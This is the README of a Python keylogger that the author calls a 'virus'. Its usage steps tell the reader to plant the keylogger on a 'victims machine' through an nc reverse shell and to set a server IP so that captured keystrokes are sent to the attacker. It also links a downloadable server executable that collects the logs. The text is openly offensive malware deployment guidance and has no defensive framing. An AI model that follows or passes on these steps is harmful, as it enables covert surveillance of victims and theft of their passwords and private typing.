# KeyLogger

Keylogger virus made in python

## Usage

1. Use tool like nc reversed shell to install keylogger on victims machine and also make sure to replace text in `todo.txt` whit actual IP address of your server port an delay (but if you don't want to send log to yourself just remove the `todo.txt` and logs will be saved locally only).

2. Download executable file for server [here](https://github.com/Josakko/KeyLogger/releases/tag/http-server-v3) (or use index.js if you are on linux machine and you don't want to use wine).

3. Now just make sure that `server.exe` is running and also keylogger is running (if server isn't running while keylogger is running everything will still work but to retrieve saved logs you will need to just run server for some time).
